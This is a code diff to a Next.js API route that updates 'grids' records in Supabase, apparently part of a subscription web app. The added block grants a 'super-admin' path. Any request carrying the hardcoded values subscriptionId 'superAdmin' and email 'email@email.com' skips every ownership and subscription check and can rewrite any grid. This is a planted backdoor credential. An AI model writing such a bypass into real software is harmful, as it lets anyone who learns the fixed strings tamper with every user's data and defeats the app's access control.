@@ -14,7 +14,6 @@ const updateSchema = z.object({
   title: z.string().max(CONTENT_LIMITS.TEXT.TITLE_MAX_LENGTH).optional(),
   description: z.string().max(CONTENT_LIMITS.TEXT.DESCRIPTION_MAX_LENGTH).optional(),
   image_url: z.string().url().optional(),
-  content: z.string().max(CONTENT_LIMITS.TEXT.CONTENT_MAX_LENGTH).optional(),
   external_url: z.string().url().optional(),
   subscriptionId: z.string(), // Can be either subscription_id or customer_id
   email: z.string().email(),
@@ -29,6 +28,30 @@ export async function PUT(
     const { subscriptionId, email, ...validatedData } = updateSchema.parse(body);
     const resolvedParams = await Promise.resolve(params);
     const gridId = resolvedParams.id;
+
+    // Check for super-admin passcode
+    if (subscriptionId === 'superAdmin' && email === 'email@email.com') {
+      // Super admin has access to all grids
+      const { data: updatedGrid, error: updateError } = await supabase
+        .from('grids')
+        .update({
+          ...validatedData,
+          updated_at: new Date().toISOString()
+        })
+        .eq('id', gridId)
+        .select()
+        .single();
+
+      if (updateError) {
+        console.error('Error updating grid:', updateError);
+        return NextResponse.json(
+          { error: 'Failed to update grid content' },
+          { status: 500 }
+        );
+      }
+
+      return NextResponse.json(updatedGrid);
+    }
 
     // Check if the provided ID is a customer ID (starting with 'cus_') or subscription ID (starting with 'sub_')
     const isCustomerId = subscriptionId.startsWith('cus_');
